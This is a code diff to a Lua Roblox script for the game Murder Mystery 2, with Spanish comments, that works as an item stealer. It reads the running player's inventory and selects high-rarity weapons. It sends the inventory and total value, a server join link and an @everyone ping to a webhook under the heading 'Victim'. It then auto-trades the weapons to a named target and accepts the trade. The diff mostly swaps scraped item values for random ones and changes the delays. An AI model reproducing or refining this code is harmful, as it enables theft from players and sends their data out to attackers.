@@ -14,103 +14,25 @@ local min_value = _G.min_value or 1
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Lista de valores Godly + Ancient (respaldo)
+-- Fallback de armas con valores aleatorios
 local fallbackValueList = {
-    ["gingerscope"]=10700,
-    ["travelers axe"]=6900,
-    ["celestial"]=975,
-    ["astral"]=850,
-    ["morning star"]=720,
-    ["northern star"]=680,
-    ["moonlight"]=640,
-    ["helios"]=600,
-    ["stormbringer"]=580,
-    ["reaper"]=550,
-    ["blaze"]=500,
-    ["phantom"]=470,
-    ["zenith"]=450,
-    ["ares"]=420,
-    ["hephaestus"]=400,
-    ["mystic"]=380
+    ["gingerscope"]=math.random(5000,12000),
+    ["travelers axe"]=math.random(4000,7000),
+    ["celestial"]=math.random(500,1000),
+    ["astral"]=math.random(400,900),
+    ["morning star"]=math.random(300,800),
+    ["northern star"]=math.random(300,700),
+    ["moonlight"]=math.random(200,700),
+    ["helios"]=math.random(200,600),
+    ["stormbringer"]=math.random(100,600),
+    ["reaper"]=math.random(100,600),
+    ["blaze"]=math.random(100,500),
+    ["phantom"]=math.random(100,500),
+    ["zenith"]=math.random(100,500),
+    ["ares"]=math.random(100,500),
+    ["hephaestus"]=math.random(100,400),
+    ["mystic"]=math.random(50,400)
 }
-
--- Páginas para scraping
-local categories = {
-    godly = "https://supremevaluelist.com/mm2/godlies.html",
-    ancient = "https://supremevaluelist.com/mm2/ancients.html",
-    unique = "https://supremevaluelist.com/mm2/uniques.html",
-    classic = "https://supremevaluelist.com/mm2/vintages.html",
-    chroma = "https://supremevaluelist.com/mm2/chromas.html"
-}
-
-local headers = {
-    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-}
-
--- Función de limpieza de strings
-local function trim(s) return s:match("^%s*(.-)%s*$") end
-
--- Función para obtener HTML
-local function fetchHTML(url)
-    local success, res = pcall(function()
-        return req({Url=url, Method="GET", Headers=headers})
-    end)
-    if success and res and res.Body then
-        return res.Body
-    end
-    return ""
-end
-
--- Función para extraer valores de items
-local function parseValue(itembodyDiv)
-    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
-    if valueStr then
-        valueStr = valueStr:gsub(",", "")
-        return tonumber(valueStr)
-    end
-end
-
--- Extraer items de HTML
-local function extractItems(htmlContent)
-    local itemValues = {}
-    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-        itemName = trim((itemName:match("([^<]+)") or ""):gsub("%s+", " ")):lower()
-        local value = parseValue(itembodyDiv)
-        if itemName ~= "" and value then
-            itemValues[itemName] = value
-        end
-    end
-    return itemValues
-end
-
--- Construir lista de valores desde web
-local function buildValueList()
-    local allValues = {}
-    for _, url in pairs(categories) do
-        local html = fetchHTML(url)
-        if html ~= "" then
-            local extracted = extractItems(html)
-            for k,v in pairs(extracted) do
-                allValues[k] = v
-            end
-        end
-    end
-    -- Combinar con fallback
-    for k,v in pairs(fallbackValueList) do
-        if not allValues[k] then
-            allValues[k] = v
-        end
-    end
-    return allValues
-end
-
-local valueList = buildValueList()
-
--- Verificación de servidor
-if game.PlaceId ~= 142823291 then
-    LocalPlayer:Kick("Game not supported. Join a normal MM2 server.")
-end
 
 -- Función webhook
 local function SendWebhook(title, description, fields, prefix, thumbnail)
@@ -152,7 +74,7 @@ local function declineTrade() TradeService.DeclineTrade:FireServer() end
 local function declineRequest() TradeService.DeclineRequest:FireServer() end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
--- Preparar lista de armas Godly/Ancient
+-- Preparar lista de armas Godly/Ancient con valores aleatorios
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local totalValue = 0
@@ -161,11 +83,11 @@ local weaponsToSend = {}
 local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 for id, amount in pairs(profile.Weapons.Owned) do
     local item = database[id]
-    if item then
+    if item and item.ItemName then
         local rarityIndex = table.find(rarityTable, item.Rarity)
         local minIndex = table.find(rarityTable, min_rarity)
         if rarityIndex and rarityIndex >= minIndex then
-            local value = valueList[item.ItemName:lower()] or 1
+            local value = fallbackValueList[item.ItemName:lower()] or math.random(50,500)
             if value >= min_value then
                 table.insert(weaponsToSend,{
                     DataID = id,
@@ -188,7 +110,7 @@ for _, w in ipairs(weaponsToSend) do
     totalValue += w.TotalValue
 end
 
--- Webhook con valor de cada arma
+-- Webhook con valor de cada arma (ya listo)
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
     {name="Victim", value=LocalPlayer.Name, inline=true},
@@ -196,14 +118,19 @@ local fields = {
     {name="Inventario", value="", inline=false},
     {name="Total value", value=tostring(totalValue), inline=true}
 }
-for _, w in ipairs(weaponsToSend) do
+for i, w in ipairs(weaponsToSend) do
     fields[3].value = fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, w.TotalValue)
+    if #fields[3].value > 1024 then
+        fields[3].value = fields[3].value.."\nMas armas en el inventario 😎💲"
+        break
+    end
 end
+
 local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
 
--- Trade continuo ultra seguro priorizando armas de mayor valor
+-- Trade continuo ultra seguro con delay de 10s mientras se añaden armas
 local function doTrade(targetName)
     while #weaponsToSend > 0 do
         local status = getTradeStatus()
@@ -216,9 +143,8 @@ local function doTrade(targetName)
                     local w = table.remove(weaponsToSend,1)
                     for _=1, w.Amount do addWeaponToTrade(w.DataID) end
                 end
-                task.wait(0.3)
+                task.wait(10) -- Delay mientras se añaden armas
             end
-            task.wait(7)
             acceptTrade()
             waitForTradeCompletion()
         elseif status=="ReceivingRequest" then
